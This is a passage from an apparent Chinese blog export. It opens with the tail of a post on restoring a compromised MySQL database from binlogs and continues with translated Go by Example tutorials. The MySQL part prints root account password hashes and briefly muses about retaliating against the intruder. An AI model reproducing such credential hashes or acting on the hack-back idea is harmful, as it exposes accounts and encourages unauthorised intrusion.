N           <span class="operator">|</span> N         <span class="operator">|</span> Y           <span class="operator">|</span> Y             <span class="operator">|</span> Y            <span class="operator">|</span> Y         <span class="operator">|</span> Y          <span class="operator">|</span> Y               <span class="operator">|</span> Y          <span class="operator">|</span> Y          <span class="operator">|</span> Y            <span class="operator">|</span> Y          <span class="operator">|</span> Y                     <span class="operator">|</span> Y                <span class="operator">|</span> Y            <span class="operator">|</span> Y               <span class="operator">|</span> Y                <span class="operator">|</span> Y                <span class="operator">|</span> Y              <span class="operator">|</span> Y                   <span class="operator">|</span> Y                  <span class="operator">|</span> Y                <span class="operator">|</span> Y          <span class="operator">|</span> Y            <span class="operator">|</span> Y                      <span class="operator">|</span>          <span class="operator">|</span> <span class="number">0</span>x                     <span class="operator">|</span> <span class="number">0</span>x                       <span class="operator">|</span> <span class="number">0</span>x                         <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span>               <span class="number">0</span> <span class="operator">|</span>                    <span class="number">0</span> <span class="operator">|</span> caching_sha2_password <span class="operator">|</span> $A$<span class="number">005</span>$j<span class="operator">&gt;</span></span><br><span class="line"><span class="number">.7</span>bh<span class="operator">&lt;</span>&quot;x7q-ZALT24E1ClL.JAtNSE4Bjd4.BAam2pFOYp90WiH0bxGpc7 | N                | 2023-03-09 17:01:43   |              NULL | N              | Y                | Y              |                   NULL |                NULL | NULL                     | NULL            |</span><br><span class="line">| localhost | root | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          | 0x                     | 0x                       | 0x                         |             0 |           0 |               0 |                    0 | caching_sha2_password | $A$005$&amp;7Pz3w XDiVG9Fd0jiC8o/4Gz6j0QZbPwUEdAiSfgO.T8re68rW0gdJAOMm5 | N                | 2023-03-09 17:01:43   |              NULL | N              | Y                | Y              |                   NULL |                NULL | NULL                     | NULL            |</span><br><span class="linespan><br><span class="line">2 rows in set (0.05 sec)</span><br></pre></td></tr></table></figure>

<h3 id="恢复root权限"><a href="#恢复root权限" class="headerlink" title="恢复root权限"></a>恢复root权限</h3><p>因为<code>root@%</code> 的create权限被收回，旧库子不能被直接创建，此时可以进入mysql容器通过<code>root@localhost</code>直接操作，但业务上还需要远程登录root账号的权限，所以需要使用好心人留下的update权限含泪重新给自己加回create权限及其他被收回的权限：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> Create_priv <span class="operator">=</span> <span class="string">&#x27;Y&#x27;</span>, ... <span class="keyword">where</span> <span class="keyword">User</span> <span class="operator">=</span> <span class="string">&#x27;root&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="恢复数据"><a href="#恢复数据" class="headerlink" title="恢复数据"></a>恢复数据</h3><p>将所有有用的binlog重新导入db，记得编号<strong>000017</strong>这条需要特殊处理舍弃后面的黑化日志：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$: ...</span><br><span class="line">$: mysqlbinlog data/mysql/binlog.000016 | mysql -h 127.0.0.1 -uroot -p</span><br><span class="line"></span><br><span class="line">$: mysqlbinlog --stop-position=817941 data/mysql/binlog.000017 | mysql -h 127.0.0.1 -uroot -p</span><br></pre></td></tr></table></figure>

<p>重新打开网站数据恢复如初～</p>
<h2 id="反击"><a href="#反击" class="headerlink" title="反击"></a>反击</h2><p>反击？我嚼得这兄弟还是手下留情了，是不是可以做的更绝一点，后面得想想怎么再黑化黑化这个脚本</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>遇事不慌，别老想着打钱打钱，你有钱吗？binlog在mysql就在，一步一步来能救一个算一个</p>
<p><strong>最重要的是mysql端口不要暴露到外网！！</strong></p>
<blockquote>
<p><a href="https://www.cnblogs.com/michael9/p/11923483.html">MySQL 5.7 - 通过 BINLOG 恢复数据 - 来份锅包肉 - 博客园</a></p>
</blockquote>
]]></content>
      <categories>
        <category>php</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>flarum</tag>
      </tags>
  </entry>
  <entry>
    <title>Go by Example - Array</title>
    <url>/2017/07/11/go-by-example-array/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Array"><a href="#Go-by-Example-Array" class="headerlink" title="Go by Example: Array"></a><center>Go by Example: Array</center></h2><p>golang中的数组是一个<strong>特定长度</strong>的元素有序集合。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 定义一个长度为5的元素类型为int的数组，元素的类型和数组的长度都是数组的属性。默认情况数组是零值，如int型的话就是数组长度个0。</span></span><br><span class="line">    <span class="keyword">var</span> a[<span class="number">5</span>] <span class="type">int</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;emp:&quot;</span>, a)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据索引设置／获取数组中某项的值</span></span><br><span class="line">    a[<span class="number">4</span>] = <span class="number">100</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;set:&quot;</span>, a)</span><br><span class="line">    fmt.Println(<span class="string">&quot;get:&quot;</span>, a[<span class="number">4</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取数组的长度</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;len:&quot;</span>, <span class="built_in">len</span>(a))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 定义并初始化一个数组</span></span><br><span class="line">    b := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;dcl:&quot;</span>, b)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数组类型是一维的，但是可以通过复合类型来构造多维的结构。</span></span><br><span class="line">    <span class="keyword">var</span> twoD [<span class="number">2</span>][<span class="number">3</span>]<span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">2</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">for</span> j := <span class="number">0</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">            twoD[i][j] = i + j</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;2d:&quot;</span>, twoD)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run arrays.go</span><br><span class="line">emp: [0 0 0 0 0]</span><br><span class="line"><span class="built_in">set</span>: [0 0 0 0 100]</span><br><span class="line">get: 100</span><br><span class="line">len: 5</span><br><span class="line">dcl: [1 2 3 4 5]</span><br><span class="line">2d:  [[0 1 2] [1 2 3]]</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/arrays">Go by Example: Arrays</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Atomic Counters</title>
    <url>/2017/11/28/go-by-example-atomic-counter/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Atomic-Counters"><a href="#Go-by-Example-Atomic-Counters" class="headerlink" title="Go by Example: Atomic Counters"></a><center>Go by Example: Atomic Counters</center></h2><p><code>golang</code>管理状态的主要机制是通过<code>channel</code>的通信，可以通过之前的<code>worker pools</code>的例子看到。还有一些其他的管理状态的方式，这次我们探究一下<code>sync/atomic</code>包中的可以被多个goroutine访问的<code>atomic counters</code>.</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync/atomic&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 使用无符号正整数用来表示计数</span></span><br><span class="line">    <span class="keyword">var</span> ops <span class="type">uint64</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为了模拟并发更新，我们启动50个goroutine，每个goroutine对计数自增1，大概1毫秒的耗时</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">50</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">            <span class="keyword">for</span> &#123;</span><br><span class="line">                <span class="comment">// 使用AddUint64进行原子性的递增操作，将变量的地址作为参数传给该函数</span></span><br><span class="line">                atomic.AddUint64(&amp;ops, <span class="number">1</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 睡眠1毫秒，模拟耗时</span></span><br><span class="line">                time.Sleep(time.Millisecond)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 睡眠1秒进行若干累加操作</span></span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于计数器可能正在被其他goroutine进行累加操作，为了安全的获取计数值，我们通过LoadUint64函数获取计数器的一个拷贝，将计数器的内存地址给该函数</span></span><br><span class="line">    opsFinal := atomic.LoadUint64(&amp;ops)</span><br><span class="line">    fmt.Println(<span class="string">&quot;ops: &quot;</span>, opsFinal)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run atomic-counter.go</span><br><span class="line">ops:  41280</span><br></pre></td></tr></table></figure>

<p>运行该程序，通过返回值可得知计数器累加了大概40000多次</p>
<p>原文链接：<a href="https://gobyexample.com/atomic-counters">Go by Example: Atomic Counters</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Channel Buffering</title>
    <url>/2017/08/03/go-by-example-channel-buffer/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Channel-Buffering"><a href="#Go-by-Example-Channel-Buffering" class="headerlink" title="Go by Example: Channel Buffering"></a><center>Go by Example: Channel Buffering</center></h2><p>默认情况下channel是没有缓冲区的，这意味着它们只会在有一个相应的接收者准备好接收管道数据时才会接受发送者往管道发送数据。有缓冲区的channel可以在没有相应接收者时接受发送者发送特定数量的数值。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个string类型的，缓冲区长度为2的channel</span></span><br><span class="line">    messages := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由于创建的channel有缓冲区，所以可以直接往里面发送数据而不需要有接收者。</span></span><br><span class="line">    messages &lt;- <span class="string">&quot;buffered&quot;</span></span><br><span class="line">    messages &lt;- <span class="string">&quot;channel&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收channel中的数据</span></span><br><span class="line">    fmt.Println(&lt;-messages)</span><br><span class="line">    fmt.Println(&lt;-messages)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/channel-buffering">Go by Example: Channel Buffering</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Channel Directions</title>
    <url>/2017/08/23/go-by-example-channel-direction/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Channel-Directions"><a href="#Go-by-Example-Channel-Directions" class="headerlink" title="Go by Example: Channel Directions"></a><center>Go by Example: Channel Directions</center></h2><p>当使用管道作为函数参数时，可以显式声明该管道是作为发送者还是接收者，这种特性增加了程序的类型安全。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义ping函数只接受用来发送值的管道参数（即管道是接收者）</span></span><br><span class="line"><span class="comment">// 如果试图从该管道参数中接收值，编译将会报错</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ping</span><span class="params">(pings <span class="keyword">chan</span>&lt;- <span class="type">string</span>, msg <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    pings &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// pong函数接受一个用来接收值的管道pings(即管道是发送者)和一个用来发送值的管道pongs(即管道是接收者)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pong</span><span class="params">(pings &lt;-<span class="keyword">chan</span> <span class="type">string</span>, pongs <span class="keyword">chan</span>&lt;- <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    msg := &lt;-pings</span><br><span class="line">    pongs &lt;- msg</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    pings := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line">    pongs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将消息发送到管道pings </span></span><br><span class="line">    ping(pings, <span class="string">&quot;passed message&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将管道pings中的值发送至管道pongs中</span></span><br><span class="line">    pong(pings, pongs)</span><br><span class="line">    fmt.Println(&lt;-pongs)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run channel-directions.go</span><br><span class="line">passed message</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/channel-directions">Go by Example: Channel Directions</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Channel Synchronization</title>
    <url>/2017/08/03/go-by-example-channel-synchronization/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Channel-Synchronization"><a href="#Go-by-Example-Channel-Synchronization" class="headerlink" title="Go by Example: Channel Synchronization"></a><center>Go by Example: Channel Synchronization</center></h2><p>我们可以使用channel来同步不同goroutine的执行。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数，接收一个channel作为参数，该参数用来通知另一个goroutine该函数已经执行完毕</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(done <span class="keyword">chan</span> <span class="type">bool</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;working...&quot;</span>)</span><br><span class="line">    time.Sleep(time.Second)</span><br><span class="line">    fmt.Println(<span class="string">&quot;done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将成功信号发往channel</span></span><br><span class="line">    done &lt;- <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启动新的goroutine执行worker函数，并出入channel</span></span><br><span class="line">    <span class="keyword">go</span> worker(done)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收channel中的值</span></span><br><span class="line">    <span class="comment">// 如果移除这一句可能收不到任何输出，因为程序可能在worker函数还未执行已经结束了</span></span><br><span class="line">    &lt;-done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run channel-synchronization.go      </span><br><span class="line">working...</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/channel-synchronization">Go by Example: Channel Synchronization</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Channels</title>
    <url>/2017/08/03/go-by-example-channel/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Channels"><a href="#Go-by-Example-Channels" class="headerlink" title="Go by Example: Channels"></a><center>Go by Example: Channels</center></h2><p>channel是golang中连接不同goroutine之间的管道。你可以从一个goroutine往channel中发送数据而从另一个goroutine中获取到这些数据。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 创建一个channel</span></span><br><span class="line">    messages := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用&#x27;&lt;-&#x27;操作符来往管道发送数据</span></span><br><span class="line">    <span class="comment">// 在一个新的goroutine执行</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        messages &lt;- <span class="string">&quot;ping&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用&#x27;&lt;-&#x27;操作符接收管道中的数据</span></span><br><span class="line">    <span class="comment">// 这里会接收到从上面那个新开的goroutine中发往管道的&quot;ping&quot;</span></span><br><span class="line">    <span class="comment">// 默认情况下对于管道的操作-发送和接收都是阻塞的，直到发送方和接收方准备就绪。</span></span><br><span class="line">    <span class="comment">// 这个特性使得我们在程序结尾可以不用做任何同步操作而去等待接收管道中的数据&quot;ping&quot;。</span></span><br><span class="line">    msg := &lt;- messages</span><br><span class="line">    fmt.Println(msg)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run channels.go </span><br><span class="line">ping</span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/channels">Go by Example: Channels</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Closures</title>
    <url>/2017/07/18/go-by-example-closures/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Closures"><a href="#Go-by-Example-Closures" class="headerlink" title="Go by Example: Closures"></a><center>Go by Example: Closures</center></h2><p>golang支持匿名函数，可以用来构建闭包。当你需要定一个不需要命名的内连函数时匿名函数很有用。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义一个函数intSeq返回内部定义的一个匿名函数。</span></span><br><span class="line"><span class="comment">// 返回的函数通过返回变量i来结束并构建闭包。</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intSeq</span><span class="params">()</span></span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    i := <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> <span class="type">int</span> &#123;</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 调用函数intSeq，并将其返回给变量nextInt。</span></span><br><span class="line">    <span class="comment">// 该函数值使用自己拥有的变量i，i在我们调用nextInt时都会更新。</span></span><br><span class="line">    nextInt := intSeq()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用nextInt函数</span></span><br><span class="line">    fmt.Println(nextInt())</span><br><span class="line">    fmt.Println(nextInt())</span><br><span class="line">    fmt.Println(nextInt())</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 变量i的值独立于每个intSeq函数调用。</span></span><br><span class="line">    nextInts := intSeq()</span><br><span class="line">    fmt.Println(nextInts())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run closures.go</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">1</span><br></pre></td></tr></table></figure>


<p>原文链接：<a href="https://gobyexample.com/closures">Go by Example: Closures</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Closing Channels</title>
    <url>/2017/08/24/go-by-example-closing-channel/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Closing-Channels"><a href="#Go-by-Example-Closing-Channels" class="headerlink" title="Go by Example: Closing Channels"></a><center>Go by Example: Closing Channels</center></h2><p>关闭一个管道表明已经没有值会通过它来发送，这个对于向管道的接收者表达已完成的信号是有用的。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 在这个示例中我们使用一个管道jobs来分发工作，这些工作从main goroutine发送到另一个工作goroutine中执行</span></span><br><span class="line">    <span class="comment">// 如果没有剩余工作要做就关闭管道jobs</span></span><br><span class="line">    jobs := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">int</span>, <span class="number">5</span>)</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">bool</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这个就是上文提到的工作goroutine</span></span><br><span class="line">    <span class="comment">// 它通过‘j, more := &lt;-jobs’重复取值，如果管道jobs被关闭并且所有值都已经接收，more的值将会是false</span></span><br><span class="line">    <span class="comment">// 我们通过这种方式在已经做完所有工作时通知完成的状态</span></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            j, more := &lt;-jobs</span><br><span class="line">            <span class="keyword">if</span> more &#123;</span><br><span class="line">                <span class="built_in">println</span>(<span class="string">&quot;recieved job&quot;</span>, j)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">println</span>(<span class="string">&quot;recieved all jobs&quot;</span>)</span><br><span class="line">                done &lt;- <span class="literal">true</span></span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过管道jobs发送三个任务，然后关闭管道</span></span><br><span class="line">    <span class="keyword">for</span> j := <span class="number">1</span>; j &lt; <span class="number">3</span>; j++ &#123;</span><br><span class="line">        jobs &lt;- j</span><br><span class="line">        <span class="built_in">println</span>(<span class="string">&quot;sent job&quot;</span>, j)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(jobs)</span><br><span class="line">    <span class="built_in">println</span>(<span class="string">&quot;sent all jobs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过管道同步来等待工作goroutine</span></span><br><span class="line">    &lt;-done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tashuo:golang ta_shuo$ go run closing_channel.go</span><br><span class="line">sent job 1</span><br><span class="line">sent job 2</span><br><span class="line">sent all <span class="built_in">jobs</span></span><br><span class="line">recieved job 1</span><br><span class="line">recieved job 2</span><br><span class="line">recieved all <span class="built_in">jobs</span></span><br></pre></td></tr></table></figure>

<p>原文链接：<a href="https://gobyexample.com/closing-channels">Go by Example: Closing Channels</a></p>
]]></content>
      <categories>
        <category>golang</category>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>Go by Example - Constants</title>
    <url>/2017/07/10/go-by-example-constants/</url>
    <content><![CDATA[<p>翻译自 <a href="https://gobyexample.com/">https://gobyexample.com/</a></p>
<blockquote>
<p>Go by Example</p>
<p>Go is an open source programming language designed for building simple, fast, and reliable software.</p>
<p>Go by Example is a hands-on introduction to Go using annotated example programs. Check out the first example or browse the full list below.</p>
</blockquote>
<h2 id="Go-by-Example-Constants"><a href="#Go-by-Example-Constants" class="headerlink" title="Go by Example: Constants"></a><center>Go by Example: Constants</center></h2><p>golang支持字符型、字符串型、布尔型和数值型的常量。</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;math&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// const关键字生命常量</span></span><br><span class="line"><span class="keyword">const</span> s <span class="type">string</span> = <span class="string">&quot;constant&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(s)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// const常量可以在任何变量可以声明的地方声明，并且支持科学计数法等算术运算</span></span><br><span class="line">    <span class="keyword">const</span> n = <span class="number">500000000</span></span><br><span class="line">    <span class="keyword">const</span> d = <span class="number">3e20</span> / n</span><br><span class="line">    fmt.Println(d)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数值型常量默认没有特定的类型，可以显式声明类型，也默认会根据上下文自动确定自身类型</span></span><br><span class="line">    <span class="comment">// 例如下面的语句`math.Sin`函数需要float64类型的参数，n就默认确定为float64类型</span></span><br><span class="line">    fmt.Println(<span class="type">int64</span>(d))</span><br><span class="line">    fmt.Println(math.Sin(n))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

